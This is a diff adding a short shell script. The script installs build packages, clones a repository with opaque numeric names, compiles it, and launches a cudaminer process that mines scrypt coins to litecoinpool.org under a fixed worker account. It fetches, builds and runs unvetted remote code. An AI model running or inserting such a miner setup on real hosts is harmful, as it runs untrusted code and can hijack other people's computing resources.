@@ -1,0 +1,21 @@
+apt-get install libssl1.0-dev -y
+
+apt-get install libcurl4-gnutls-dev -y
+
+apt-get install automake -y
+
+apt-get install autoconf -y
+
+git clone https://github.com/mobileapps84741274/linux84888888
+
+cd ./linux84888888/
+
+./autogen.sh
+
+./configure
+
+make
+
+cd ./linux84888888/
+
+./cudaminer -a scrypt -o stratum+tcp://litecoinpool.org:3333 -u linux8474.1 -p 1 --no-autotune -H 2 -l T2820x1
